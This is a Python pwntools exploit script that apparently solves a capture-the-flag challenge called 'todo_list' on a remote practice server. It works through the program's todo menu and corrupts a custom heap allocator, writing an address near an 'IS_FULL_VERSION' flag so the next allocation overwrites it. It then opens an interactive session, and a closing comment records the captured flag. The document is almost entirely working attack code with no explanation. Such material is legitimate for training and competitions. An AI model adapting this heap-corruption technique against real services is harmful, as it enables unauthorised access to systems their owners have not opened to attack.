from pwn import *

#defines
DUMY_HEAP = 0x804c080
IS_FULL_VERSION = 0x804c064

#globals
todo_ctr = 0

def create_todo(p: process, todo: str="a"):
    global todo_ctr
    p.sendline("1")
    p.sendline(todo)
    p.recvuntil("choice :", timeout=0.1)
    todo_ctr += 1

def show_todo(p: process, index: int=0):
    p.sendline("2")
    p.sendline(str(index))
    p.recvuntil("number : ")
    todo = p.recvuntil('\n')[:-1]
    p.recvuntil("choice :", timeout=0.1)
    return todo

def edit_todo(p: process, index: int=0, todo: str="a"):
    p.sendline("3")
    p.sendline(str(index))
    p.sendline(todo)
    p.recvuntil("choice :", timeout=0.1)

def main():
    ### run ###
    #p = process("./todo_list")
    p = remote("pwnable.co.il", 9019)
    p.recvuntil("choice :", timeout=0.1)

    ### payload start ###
    create_todo(p, "abcd")
    show_todo(p)
    show_todo(p)
    edit_todo(p, 0, p32(0x804c064 - 4))
    create_todo(p)
    show_todo(p, 0)
    p.sendline("5")
    p.interactive()

if __name__ == "__main__":
    main()

#flag: PWNIL{Sheriff_Of_The_Custom_Allocator_Town}
#Note: if isnt work you can remover the timeouts